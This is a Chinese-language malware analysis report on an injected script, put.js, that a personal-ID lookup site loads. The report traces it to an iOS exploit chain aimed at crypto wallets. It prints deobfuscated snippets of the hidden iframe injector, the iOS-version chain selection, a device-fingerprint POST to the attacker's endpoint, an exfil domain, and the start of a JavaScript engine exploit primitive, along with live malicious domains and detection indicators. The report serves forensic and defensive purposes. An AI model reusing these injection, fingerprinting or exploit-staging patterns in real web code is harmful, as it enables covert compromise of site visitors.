# put.js 深度分析报告

> 样本：`https://abc.007tx1a1lb7rr16xwm.site/rejs/put.js?channelCode=...`
> 大小：29,493 字节 / 73 行 ｜ SHA-256：`a4f8dbe3e9933b62a948ff8f1d64b96f629d083ae20a52f56e56d97478ca2a1b`
> 落点：`https://charen.shop/`（该"查身份证"站点首页末尾唯一的外域脚本）
> 分析方式：纯静态还原 + 只读取证，未执行任何利用代码

---

## 0. 结论先行

**`put.js` 不是广告统计 SDK，是一个 iOS 漏洞利用投递器（exploit delivery loader）的前端注入端。**

它在被嵌页面（charen.shop）里做三件事：

1. 给访客打一个持久化 UUID（localStorage + 一年期 Cookie），拼出 `channelCode / sessionId / h1(被嵌页域) / h2(投放方域)` 的归因上下文；
2. 往页面里塞一个 **1×1 不可见 iframe**，指向投放方自己的域 `abc.007tx1a1lb7rr16xwm.site`，归因信息通过 `iframe.name` 传递；
3. 子页面读取 **iOS 大版本号**，在 4 条漏洞利用链中选一条（`coruna` / `silkpath` / `darksword` / `ghostwave`），拉取对应版本的 RCE worker 执行。

二、三级载荷已实证：

| 层级 | 路径 | 实测 |
|---|---|---|
| L1 注入器 | `/rejs/put.js` | 200, 29,493 B |
| L2 分发器 | `/mss/index.html?channelCode=...` | 200, 18,371 B（Cloudflare, `cf-cache-status: DYNAMIC`） |
| L3 利用载荷 | `/rce_worker_18.6.js` | **200, `application/javascript`, 748,678 B** |
| L3 备用入口 | `/coruna/group.html` | 404（该链当前未部署） |

前 2KB worker 前缀是标准的 JSC 类型混淆原语初始化（Web Worker 全局 `self[0]/self[1]` 上挂 unboxed/boxed 数组对、`no_cow` 常量、`offsets` 偏移表、`MessageName` Mach 消息名），与"沙箱逃逸 + 提权"的表述完全吻合。

**风险性质因此需要改写：不是"可能被窃取查询内容"，而是"iPhone 访客可能被静默控制设备"。**

---

## 1. 结构解剖：66% 的字节是死代码

文件只有 73 行，长度分布极不均匀：

| 行 | 长度 | 内容 |
|---|---|---|
| L1 | **19,518 B** | obfuscator.io 风格的字符串表 + base64/RC4 解码器 + 数组旋转 IIFE |
| L2–L72 | ~10,000 B | **完全明文**的主逻辑 IIFE |

三条交叉验证说明 L1 是纯装饰：

1. 明文区对 `a0_0x*` 的引用数 = **0**（`tail -n +2 put.js | grep -c a0_0x`）；
2. L1 内部的 `a0_0x48aa(` 出现次数 = **2**，全部是解码器自身的惰性初始化自引用；
3. 极简 stub 下 `vm.runInContext(put.js)` **8ms 正常结束**，没有死循环、没有自防御。

> **更正**：上一轮我曾判断"混淆体自带 self-defending 死循环、会让沙箱超时"。那是我的 Proxy 桩触发的假象——用真实 stub 复测后，脚本干净退出。此项撤回。

**设计意图推断**：把 19KB 混淆噪声放在文件头，是为了让静态扫描器和人工审核在前几百行就判定"这是个混淆的第三方 SDK"；而真正逻辑用明文写在尾部，恰好绕开"检测高度混淆 JS"这类规则。混淆在这里的作用是 **伪装成常规 SDK，而不是保护逻辑**。

---

## 2. 明文载荷逐层还原

### 2.1 入口守卫（L5–L7）

```js
var _p = location.pathname;
if (_p === "/forms/metrics.html" || _p === "/mss/index.html"
    || window["__PUT_UNIFIED_BOOTSTRAPPED__"]) return;
window["__PUT_UNIFIED_BOOTSTRAPPED__"] = true;
```

- 只解码出 3 个字符串：`/forms/metrics.html`、`/mss/index.html`、`__PUT_UNIFIED_BOOTSTRAPPED__`（`_d()` 是 hex→URL 解码）。
- 两个路径正是它自己会加载的两个子页 —— **防止 iframe 无限套娃**。
- 全局标记防止同一页面重复注入。

### 2.2 归因上下文（L9–L15）

```js
var _h2 = _originFromUrl(_src) || 'https://abc.007tx1a1lb7rr16xwm.site';  // 投放方域
var _h1 = _locationOrigin();                                              // 被嵌页域
var _channelCode = _ccp() || _param(_src,'c') || _param(_src,'channelCode');
```

`_ccp()` 内硬编码了一张**站群渠道码映射表**——这是整份脚本信息量最大的片段：

| 页面路径首段 | channelCode |
|---|---|
| `SDNSD001` | `d702be50148f5ed339c1308659d2d1ea` |
| `SDNSD002` | `09b0b5a3e489a41e26b13dd42d140e3c` |
| `SDNSD003` | `02fa74c00d786dce969c9cba669918f7` |
| `SDNSD004` | `fc4055d5d100f5f15a4fafb5812808ba` |
| `SDNSD005` | `4dd479b275f193072bc74ad03fbf47ac` |
| `SDNSD006` | `54e0d893c34307c0155852bba8b43903` |
| `SDNSD007` | `d60fb975d7760d4910092d12de6c8fe6` |
| `SDNSD008` | `893a7e87c696e65ac3f2966af869318b` |
| `SDNSD009` | `e9d0f0667a6bb304d3ec12c5f0acb759` |
| `SDNSD010` | `65611b8c124d3054b5e269480ee29bc2` |
| 其它（含 charen.shop 的 `/`） | `7e83e3b23df152b6925485f478f3c5a6` |

两点推论：

- 同一个脚本被 **10 个以上的落地站群**复用，按 URL 第一段区分渠道 → 批量运营、集中投毒。
- 由于 `_ccp()` 永远返回非空串（兜底默认码），`||` 短路使脚本 URL 上的 `?channelCode=` 参数**完全失效**——渠道归属只由页面路径决定，URL 参数形同虚设。

### 2.3 设备分流：不是"18 岁以下"，是 iOS 大版本号

这是全脚本最容易被误读的地方：

```js
function _ios(){ var m = ua.match(/CPU iPhone OS (\d+)[_.](\d*)/) ... return {major: ...}; }
function _less18(){ var n = _ios().major; return n >= 1 && n < 18; }
```

`_less18()` = **iOS major < 18**，与年龄、成年与否无关（`_ge18FrameKey = '__er_frame_at'` 同理）。实测分支：

| 访客 | `_less18` | 加载地址 |
|---|---|---|
| 桌面 Chrome / Android | false（major=0） | `/mss/index.html?channelCode=…` |
| iPhone iOS 17.5 | **true** | `/{channelCode}/forms/metrics.html` |
| iPhone iOS 18.1 | false | `/mss/index.html?channelCode=…` |

即：**只有 iOS ≤ 17 的 iPhone 被送到"另一条轻量路径"，其余全部进主分发器**。这条按 OS 版本分流的写法，本身就是"按可利用性分发"的典型特征（见 §3 的版本分档）。

### 2.4 隐藏 iframe 注入（L60）

```js
iframe.setAttribute('data-put-metrics','1');
iframe.setAttribute('aria-hidden','true');
iframe.tabIndex = -1;
iframe.style.cssText = 'display:block;width:1px;height:1px;border:0;'
  + 'position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none;overflow:hidden;';
iframe.name = 'put.entryContext.v1:' + encodeURIComponent(JSON.stringify(_entryContext()));
document.body.appendChild(iframe);
iframe.src = _frameUrl();
```

- **完全不可见**：1×1 像素、移出视口、`opacity:0`、`aria-hidden`、`tabIndex=-1`、`pointer-events:none`。用户与常规 DOM 检查（`aria`、Tab 焦点）都发现不了。
- **归因走 `iframe.name` 而不是 URL 参数**：`put.entryContext.v1:{channelCode,browserUUID,sessionId,h1,h2}`。子页 `parseEntryContext()` 从 `window.name` 读回。这条通道不产生 URL 特征，不易被"可疑查询串"类拦截规则命中。
- 属性名 `data-put-metrics`（"指标"）是伪装——真实用途是漏洞投递。

### 2.5 与子页面的信号通道（L63）

父页只接受 `ev.origin === _h2` **且** `ev.source === _frame.contentWindow` 的消息（校验写得相当规范），只处理 5 种指令：

| 指令 | 父页动作 |
|---|---|
| `ds-gpu-blank` | **把 iframe src 置为 `about:blank`** |
| `ds-wc-crash` | 同上传空 |
| `ds-pe-spawned` | 仅记录（提权已启动） |
| `ds-sbx-stall` | 仅记录（沙箱逃逸停滞） |
| `ds-chain-settle` | 仅记录 |

`gpu-blank` / `wc-crash` 的语义很明确：**当利用链把 GPU 进程打崩、或 WebView 崩溃时，父页立刻把现场抹成空白**——防截图取证、防自动化审查留存证据。

### 2.6 自愈与节流（L61、L66–L68）

- iframe 加载失败重试：**5s / 35s / 65s**，最多 3 次，每次先 `removeChild` 再重建；
- 非 iOS<18 分支有 `__er_frame_at` 节流，**1 小时一次**（`_ge18FrameTtl = 3600000`）；
- 启动双定时器：**3s** 主启动 + **8s** 兜底启动，提高植入成功率；
- 停留计时器每 5s 打点、上限 180s（`_log` 在本构建中是空函数，见 §2.7）。

### 2.7 父页自身零外发

| 函数 | 调用次数 | 结论 |
|---|---|---|
| `_log(stage,progress,text){}` | 定义 + 7 处调用 | **函数体为空**，全部打点被掏空 |
| `_post(url,body)` | **1（仅定义）** | 从未被调用 |
| `_qLog(base,o)` | **1（仅定义）** | 从未被调用 |
| `_headers()` | 2（定义 + 被 `_post` 调用） | 随 `_post` 一起失效 |

因此 `xx-u / xx-s / xx-t / xx-h / xx-f / xx-st` 这套自定义请求头在**本构建中没有实际发出过**。父页自身不发任何网络请求，所有外发都由跨域子页面完成——职责切得很干净，也让"父页看不出恶意"成立。

---

## 3. 第二级：`/mss/index.html` —— 利用链分发器

18KB、`lang="zh-Hant"`、`<title>` 为空。开头先埋一个全局 exfil 域：

```js
globalThis.__LAB_EXFIL_DOMAIN__ = "nt.007tx1a1lb7rr16xwm.site";
```

### 3.1 版本分档 → 链选择（L194–L255）

```js
function isCorunaRange(v){ if(v[0] < 13) return false; if(v[0] >= 18) return false;
  if(v[0]===17 && v[1]>=3) return false; if(v[0]===17 && v[1]===2 && v[2]>1) return false; return true; }
function isSilkPathRange(v){ /* 17.2.2+ ~ 18.3 */ }
function isExploitChainRange(v){ if(v[0]===18 && v[1]>=4) return true; if(v[0]>=19 && v[0]<=26) return true; }
```

| chainId | iOS 区间 | 入口 / worker |
|---|---|---|
| `coruna` | 13.0 – 17.2.1 | `/coruna/group.html`、`/coruna/coruna_loader.js` |
| `silkpath` | 17.2.2 – 18.3 | `/SilkPath/delivery/silkpath_loader.js` |
| `darksword` | 18.4 – 18.7.2 | `/rce_loader.js` → `rce_worker_18.4/18.5/18.6/18.7.js` |
| `ghostwave` | 18.7.3 / 19–26 | 同上 |
| `blocked` | 其它 | `/chain_blocked.js` |

`Coruna`、`SilkPath` 都是有公开记录的 iOS 利用链代号；`darksword` / `ghostwave` 是这套工具自己的命名。分档之细（精确到 18.5 回退到 18.4 worker、18.7.3 切换 ghostwave）说明维护方在持续跟进新版本。

### 3.2 阶段进度（L16）

```js
var STAGE = { boot: 8, loader: 18, worker: 42, sbx0: 58, sbx1: 72, pe: 86, post: 100 };
```

`boot → loader → worker → sbx0 → sbx1 → pe → post`，即 **引导 → 加载 → RCE worker → 沙箱逃逸#1 → 沙箱逃逸#2 → 提权 → 后渗透**。同一页面里还预取（`preload`/`prefetch`）：

```
/sbx0_main_18.4.js   /sbx1_main.js   /pe_main.js
```

### 3.3 劫持 `console.log` 反推利用进度（L462–L501）

这页最露骨的部分——它把 exploit 自己打的日志当进度条用：

```js
console.log = function () {
  var msg = [...arguments].join(' ');
  if (/stage1|RCE success|handoff ok/i.test(msg))                     notify('worker', 42);
  if (/sbx1_main|mediaplaybackd|\[patch\] loaded bootstrap/i.test(msg)) notify('sbx1', 72);
  if (/pe_main|kernel_base|kernel_slide|pe spawned|Spawning PE/i.test(msg)) notify('pe', 86);
  if (/file_downloader_ok|chain.?complete/i.test(msg))                notify('post', 100);
  if (/wallet_memory|wallet_crypto|coruna_s5/i.test(msg))             notify('pe', 90, '權限提升 · 後台收尾');
  if (/GPU crashed at CoreAnimation|waiting for sendPort|oob:.*hang/i.test(msg))
      postMessage({type:'ds-sbx-stall', progress:58}, '*');
  if (/crashGPUProcess|gpu_blank_expected|going to respawn gpu/i.test(msg))
      postMessage({type:'ds-gpu-blank', progress:58}, '*');
  ...
};
```

关键字层面可直接读出攻击链的后半段：`kernel_base` / `kernel_slide`（内核地址泄露）、`sendPort` / Mach 消息（沙箱逃逸通信）、`Spawning PE`（提权进程）、**`wallet_memory` / `wallet_crypto`**（钱包内存与密钥抓取）、`file_downloader_start`（落地文件下载）、`S5_post` / `post /stats`（后渗透回传）。

**"wallet_memory / wallet_crypto" 让动机落地：这是一条以窃取 iOS 加密钱包为目的的利用链，而不是"弹广告"。**

### 3.4 首屏即指纹上报（L300–L328）

```js
fetch(location.origin + '/clt/r', { method:'POST', keepalive:true,
  headers:{ 'xx-u':browserUUID, 'xx-s':sessionId, 'xx-t':Date.now(),
            'xx-h':h1, 'xx-f':h2, 'xx-st':visibilityState },
  body: JSON.stringify({ channelCode, deviceModel, deviceType, osName, osVersion,
                         browserName, browserVersion }) });
```

精准上报设备型号 / 类型 / **iOS 版本** / 浏览器内核 —— 服务端据此二次决定下发哪条链（客户端分档只是第一道）。

---

## 4. 第三级实证：`rce_worker_18.6.js`

```
HTTP/2 200
content-type: application/javascript
content-length: 748678
content-range: bytes 0-2047/748678   （Range 请求）
last-modified: Fri, 09 Oct 2026 17:55:13 GMT
```

731 KB 的单文件 worker。前 2KB 是 JSC 利用原语的初始化骨架（**此处只做定性，不展开利用细节**）：

```js
var SERVER_LOG;  let offsets;  let MessageName;
const no_cow = 1.1;
const unboxed_arr = [no_cow];
const boxed_arr = [{}];
self[0] = unboxed_arr;   // self = Web Worker 全局
self[1] = boxed_arr;
```

`self[0]/self[1]` 上挂 unboxed(double) / boxed(object) 数组对、`no_cow` 常量、`offsets` 偏移表、`MessageName`（Mach 消息名）——这是 JSC 类型混淆 + 地址泄露的标准起手式，且运行在 **Web Worker** 里（与 STAGE `worker:42` 对应）。

`/coruna/group.html` 当前返回 404，说明**四条链并未全部常开**，按渠道/时段动态挂载；`/rce_worker_*.js` 则常驻可下载。

---

## 5. 风险定级

| 对象 | 等级 | 说明 |
|---|---|---|
| charen.shop 的 **iOS 访客** | **严重** | 静默投递漏洞利用链，最终目标含钱包内存/密钥；用户无感知、无交互、无提示。1×1 隐藏 iframe + 崩溃即抹现场，取证窗口极短 |
| charen.shop 的 **非 iOS 访客** | **高** | 不进利用链，但仍被植入第三方隐藏 iframe、被打一年期 UUID、被 `/clt/r` 上报设备指纹 |
| charen.shop 运营方 | **严重** | 既是个人信息黑产，又是投毒载体；一旦被查，除侵犯公民个人信息外还可能叠加帮助信息网络犯罪活动 |
| 同一 SDK 的其它站群（`SDNSD001`–`SDNSD010`） | **严重** | 同一套注入器，同样投毒 |
| `abc.` / `nt.007tx1a1lb7rr16xwm.site` | **严重** | Cloudflare 前置的投放/回传双域，`/stats`、`/clt/r` 为回传端点 |

一句话：**这套东西的存在，把"这个查身份证的站能不能信"这个问题变得没有意义了——它本身就是攻击面。**

---

## 6. 对上一版报告的更正

| 上一版表述 | 本次结论 |
|---|---|
| "该脚本可读取你在输入框填写的身份证号" | **证伪（能力层面）**。`put.js` 未访问任何表单/输入/页面文本；`document.cookie` 读取被正则限定在自身 key `put_browser_uuid_v1`，不是 Cookie 窃取。它只读 UA、`visibilityState`、`location`、自己的 localStorage/sessionStorage |
| "行为不可静态判定" | **已判定**。三级链路全部取证，父页零外发、子页做指纹与链分发、worker 是 748KB 利用载荷 |
| "混淆体导致沙箱超时/自防御" | **撤回**。真实 stub 下 8ms 干净退出，混淆层是死代码 |

但**总体风险是升级而非降级**：从"可能被窃取输入内容"变成"可能被控制设备"。

---

## 7. 建议

**普通用户**

- iPhone 上不要打开 charen.shop 及任何 `SDNSD001`–`SDNSD010` 路径特征的站点；已打开过则视为设备可能失陷，优先用另一台设备修改重要账号密码与钱包助记词。
- 该链按 iOS 版本分档，**保持系统更新**只改变被哪条链打，不等于安全。
- 出现"页面空白/自动刷新/莫名卡顿后恢复"（`wc-crash` 抹现场、crash-loop breaker 的典型表现）时，立刻断网并做取证备份。
- 手机上有加密钱包的，务必把助记词迁移到不联网的介质，不要只在手机里存。

**企业与审核方**

- 把 `abc.007tx1a1lb7rr16xwm.site`、`nt.007tx1a1lb7rr16xwm.site` 及 `007tx1a1lb7rr16xwm.site` 整个域加入阻断；特征是 Cloudflare 前置、`x-content-type-options: nosniff` + `cache-control: no-transform`、`/rejs/put.js`、`/mss/index.html`、`/rce_worker_*.js`、`/clt/r`、`/stats`。
- 检测规则可对齐本文 §2.3/§2.5 的强特征：`__PUT_UNIFIED_BOOTSTRAPPED__`、`put.entryContext.v1`、`data-put-metrics`、`ds-gpu-blank` / `ds-sbx-stall`、`__LAB_EXFIL_DOMAIN__`。
- 这类投递依赖隐藏 iframe，**在网关侧限制 iframe 目标域白名单**比拦脚本更有效。

**站方（如为受害者）**

- 立即移除页尾 `abc.007tx1a1lb7rr16xwm.site/rejs/put.js` 引用；排查是否被植入或被"流量合作"引入。
- 保存服务器访问日志（含 `Referer`、`/rejs/put.js` 请求）作为证据。

---

## 8. 方法与边界声明

**做了什么（共 5 次只读请求，均为公开资源）**

1. `GET /rejs/put.js`（此前已取，本地分析）
2. `GET /mss/index.html?channelCode=7e83…&browserUUID=000…`（一次）
3. `HEAD /rce_worker_18.6.js`（一次）
4. `HEAD /coruna/group.html`（一次）
5. `GET /rce_worker_18.6.js` 的 `Range: bytes 0-2047`（2KB 前缀）

**没有做**

- 未执行任何 exploit、未在真机/模拟器上验证利用链可用性；
- 未完整下载 731KB worker（避免持有完整利用代码），仅取 2KB 做定性；
- 未向 `/clt/r`、`/stats` 写入任何数据，未做注入/越权/爆破/目录遍历；
- 未访问 `buyerhou.charen.shop` 等其它子域；
- 未提交任何真实身份证号、手机号等个人信息到 charen.shop 的查询接口。

**不确定性**

- 四条链的实际成功率未知（需真机验证，本文不做）；
- `silkpath` / `ghostwave` 的 worker 文件命名由代码常量推得，未逐个 HEAD 确认；
- L1 混淆层的原始用途无法还原（其字符串表为 RC4 加密且从不被调用），本文只断言"当前构建中为死代码"，不断言它历史上是什么。

---

## 附录 A：完整还原版代码

- 去混淆后的主体：`charen_recon/put_body_decoded.js`（71 行，`_d()` 已全量还原）
- 原始样本：`charen_recon/put.js`
- 二级分发器：`charen_recon/mss_index.html`（可读排版：`mss_readable.txt`）

## 附录 B：证据文件清单

| 文件 | 内容 |
|---|---|
| `charen_recon/put.js` | 原始样本，29,493 B |
| `charen_recon/put_body_decoded.js` | 明文载荷完整还原 |
| `charen_recon/exec_test.txt` | vm 执行验证（正常结束 8ms） |
| `charen_recon/mss_index.html` / `mss_hdr.txt` | 二级分发器及响应头 |
| `charen_recon/mss_readable.txt` | 分发器逐行可读版（469 行） |
| `charen_recon/rce_worker_head.bin` / `rce_hdr.txt` | worker 前 2KB 与 206 响应头 |
| `charen_recon/put_headers.txt` | put.js 原始响应头 |
